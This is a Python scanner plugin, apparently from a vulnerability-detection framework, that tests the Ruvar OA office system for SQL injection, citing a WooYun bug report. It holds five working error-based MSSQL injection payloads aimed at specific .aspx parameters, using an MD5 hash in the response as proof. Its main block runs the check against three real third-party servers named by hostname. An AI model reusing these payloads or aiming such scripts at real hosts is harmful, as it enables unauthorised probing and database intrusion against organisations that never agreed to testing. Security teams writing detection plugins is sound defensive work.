#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:璐华通用企业版OA系统SQL注入
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0104430

def assign(service,arg):
    if service=="ruvar_oa":
        return True,arg 
    


def  audit(arg):
    ps=[
        "include/get_dict.aspx?bt_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
        "LHMail/email_attach_delete.aspx?attach_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
        "bulletin/bulletin_template_show.aspx?id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
        "filemanage/file_memo.aspx?file_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
        "CorporateCulture/kaizen_download.aspx?file_id=1%27%29%20and%20%28select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%29%3E0--",
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)
        if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
            security_hole(url)
    
if __name__=="__main__":
    from dummy import *
    audit(assign('ruvar_oa','http://oa.gdjierong.com:8090/')[1])
    audit(assign('ruvar_oa','http://oa.mingshiedu.com:801/')[1])
    audit(assign('ruvar_oa','http://oa.pku-ioe.cn/')[1])